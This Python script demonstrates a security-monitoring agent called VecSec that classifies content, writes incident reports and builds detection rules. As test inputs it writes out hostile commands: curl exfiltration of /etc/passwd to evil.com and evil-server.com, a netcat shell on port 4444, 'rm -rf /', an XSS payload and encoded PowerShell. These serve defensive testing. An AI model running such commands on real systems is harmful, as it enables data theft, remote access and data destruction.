"""
VecSec AI Agent - Example Usage and Demonstrations
=================================================

This file demonstrates how the AI agent works in practice,
showing real-world scenarios and use cases.
"""

import asyncio
import json
from datetime import datetime
from ai_agent import VecSecAgent, SecurityIncident, ThreatLevel, IncidentSeverity, AgentAction

async def demonstrate_agent_capabilities():
    """Demonstrate the AI agent's read, write, and label capabilities"""
    
    print("🤖 VecSec AI Agent Demonstration")
    print("=" * 60)
    
    # Initialize the agent
    agent = VecSecAgent()
    
    # 1. READ CAPABILITIES DEMONSTRATION
    print("\n📖 READ CAPABILITIES")
    print("-" * 30)
    
    # Read network traffic
    print("Reading network traffic...")
    traffic = await agent.read_network_traffic(duration=30)
    print(f"Captured {len(traffic)} traffic events")
    
    # Read file content
    print("\nReading file content...")
    file_analysis = await agent.read_file_content("malware_bert.py")
    print(f"File analysis: {file_analysis.get('analysis', {}).get('threat_level', 'unknown')}")
    
    # 2. WRITE CAPABILITIES DEMONSTRATION
    print("\n✍️ WRITE CAPABILITIES")
    print("-" * 30)
    
    # Create a sample incident
    sample_incident = SecurityIncident(
        id="demo_incident_001",
        timestamp=datetime.now(),
        source_ip="192.168.1.100",
        target_url="https://suspicious-site.com/malware",
        threat_level=ThreatLevel.MALICIOUS,
        severity=IncidentSeverity.HIGH,
        indicators=["Suspicious shell commands detected", "Encoded payloads detected"],
        patterns_found=["curl https://evil.com --data", "base64: SGVsbG8gV29ybGQ="],
        agent_decision=AgentAction.BLOCK,
        confidence=0.95,
        risk_score=0.92,
        raw_data="curl https://evil.com --data \"$(cat /etc/passwd)\""
    )
    
    # Write security report
    print("Writing security report...")
    report_file = await agent.write_security_report(sample_incident)
    print(f"Report saved to: {report_file}")
    
    # Write detection rules
    print("\nWriting detection rules...")
    new_patterns = [
        "rm -rf /",
        "curl.*--data",
        "base64.*payload",
        "nc -l.*4444"
    ]
    rules_file = await agent.write_detection_rules(new_patterns)
    print(f"Detection rules saved to: {rules_file}")
    
    # 3. LABEL CAPABILITIES DEMONSTRATION
    print("\n🏷️ LABEL CAPABILITIES")
    print("-" * 30)
    
    # Test different types of content
    test_contents = [
        "Hello world, this is normal text",
        "curl https://evil.com --data \"$(cat /etc/passwd)\"",
        "rm -rf / && while true; do nc -l 4444; done",
        "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
        "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA7AA=="
    ]
    
    for i, content in enumerate(test_contents, 1):
        print(f"\nTest {i}: {content[:50]}...")
        
        # Label threat level
        threat_level, confidence, indicators = await agent.label_threat_level(content)
        print(f"  Threat Level: {threat_level.value}")
        print(f"  Confidence: {confidence:.2f}")
        print(f"  Indicators: {indicators}")
        
        # Label attack type
        attack_types = await agent.label_attack_type([content])
        if attack_types:
            print(f"  Attack Types: {', '.join(attack_types)}")

async def demonstrate_autonomous_analysis():
    """Demonstrate autonomous analysis capabilities"""
    
    print("\n🤖 AUTONOMOUS ANALYSIS DEMONSTRATION")
    print("=" * 50)
    
    agent = VecSecAgent()
    
    # Test URLs with different threat levels
    test_urls = [
        "https://httpbin.org/get",  # Clean
        "https://httpbin.org/post",  # Clean
        "https://suspicious-site.com",  # Potentially suspicious
    ]
    
    for url in test_urls:
        print(f"\nAnalyzing: {url}")
        print("-" * 40)
        
        try:
            result = await agent.run_autonomous_analysis(url)
            
            print(f"Decision: {result['decision']}")
            print(f"Report: {result['report_file']}")
            print(f"Recommendations: {len(result['recommendations'])} items")
            
            # Show incident details
            incident = result['incident']
            print(f"Threat Level: {incident['threat_level']}")
            print(f"Risk Score: {incident['risk_score']:.2f}")
            print(f"Confidence: {incident['confidence']:.2f}")
            
        except Exception as e:
            print(f"Analysis failed: {e}")

async def demonstrate_learning_capabilities():
    """Demonstrate the agent's learning capabilities"""
    
    print("\n🧠 LEARNING CAPABILITIES DEMONSTRATION")
    print("=" * 50)
    
    agent = VecSecAgent()
    
    # Show initial memory state
    print("Initial Agent Memory:")
    status = await agent.get_agent_status()
    print(f"  Memory Size: {status['memory_size']}")
    print(f"  Learned Patterns: {status['learned_patterns']}")
    
    # Simulate learning from multiple incidents
    learning_incidents = [
        {
            "content": "curl https://evil.com --data \"$(cat /etc/passwd)\"",
            "expected_threat": ThreatLevel.MALICIOUS
        },
        {
            "content": "rm -rf /home/user/important_files",
            "expected_threat": ThreatLevel.MALICIOUS
        },
        {
            "content": "Hello world, this is normal text",
            "expected_threat": ThreatLevel.CLEAN
        }
    ]
    
    print("\nLearning from incidents...")
    for i, incident in enumerate(learning_incidents, 1):
        print(f"\nLearning Incident {i}:")
        print(f"Content: {incident['content'][:50]}...")
        
        # Analyze and learn
        threat_level, confidence, indicators = await agent.label_threat_level(incident['content'])
        print(f"Detected: {threat_level.value} (confidence: {confidence:.2f})")
        print(f"Expected: {incident['expected_threat'].value}")
        
        # Check if learning is working
        if threat_level == incident['expected_threat']:
            print("✅ Correct classification")
        else:
            print("❌ Misclassification - agent will learn from this")
    
    # Show updated memory state
    print("\nUpdated Agent Memory:")
    status = await agent.get_agent_status()
    print(f"  Memory Size: {status['memory_size']}")
    print(f"  Learned Patterns: {status['learned_patterns']}")

async def demonstrate_real_world_scenario():
    """Demonstrate a real-world cybersecurity scenario"""
    
    print("\n🌍 REAL-WORLD SCENARIO DEMONSTRATION")
    print("=" * 50)
    
    agent = VecSecAgent()
    
    # Scenario: Detecting a data exfiltration attempt
    print("Scenario: Data Exfiltration Detection")
    print("=" * 40)
    
    # Simulate suspicious network activity
    suspicious_content = """
    #!/bin/bash
    # Data exfiltration script
    curl -X POST https://evil-server.com/collect \
         --data "$(cat /etc/passwd | base64)" \
         --header "Authorization: Bearer secret-token"
    
    # Additional malicious activity
    rm -rf /tmp/evidence
    nc -l 4444 -e /bin/bash
    """
    
    print("Analyzing suspicious content...")
    print(f"Content: {suspicious_content[:100]}...")
    
    # Analyze the content
    threat_level, confidence, indicators = await agent.label_threat_level(suspicious_content)
    attack_types = await agent.label_attack_type([suspicious_content])
    
    print(f"\nAnalysis Results:")
    print(f"  Threat Level: {threat_level.value}")
    print(f"  Confidence: {confidence:.2f}")
    print(f"  Attack Types: {', '.join(attack_types)}")
    print(f"  Indicators: {indicators}")
    
    # Create incident
    incident = SecurityIncident(
        id="exfiltration_001",
        timestamp=datetime.now(),
        source_ip="192.168.1.50",
        target_url="https://evil-server.com/collect",
        threat_level=threat_level,
        severity=IncidentSeverity.CRITICAL,
        indicators=indicators,
        patterns_found=[],
        agent_decision=AgentAction.BLOCK,
        confidence=confidence,
        risk_score=confidence,
        raw_data=suspicious_content
    )
    
    # Generate comprehensive report
    print("\nGenerating security report...")
    report_file = await agent.write_security_report(incident)
    print(f"Report saved to: {report_file}")
    
    # Generate policy recommendations
    print("\nGenerating policy recommendations...")
    policy_file = await agent.write_policy_recommendations([incident])
    print(f"Policy recommendations saved to: {policy_file}")
    
    # Show agent's decision
    decision = agent._make_decision(threat_level, confidence)
    print(f"\nAgent Decision: {decision.value}")
    
    if decision == AgentAction.BLOCK:
        print("🚫 BLOCKING: Malicious activity detected and blocked")
    elif decision == AgentAction.ESCALATE:
        print("🚨 ESCALATING: Critical threat requires human intervention")
    elif decision == AgentAction.INVESTIGATE:
        print("🔍 INVESTIGATING: Suspicious activity requires further analysis")

async def main():
    """Run all demonstrations"""
    try:
        await demonstrate_agent_capabilities()
        await demonstrate_autonomous_analysis()
        await demonstrate_learning_capabilities()
        await demonstrate_real_world_scenario()
        
        print("\n✅ All demonstrations completed successfully!")
        print("\nThe VecSec AI Agent demonstrates:")
        print("  📖 READ: Network traffic, files, logs")
        print("  ✍️ WRITE: Reports, rules, policies")
        print("  🏷️ LABEL: Threats, incidents, attacks")
        print("  🤖 AUTONOMOUS: Real-time analysis and decisions")
        print("  🧠 LEARNING: Pattern recognition and adaptation")
        
    except Exception as e:
        print(f"❌ Demonstration failed: {e}")

if __name__ == "__main__":
    asyncio.run(main())
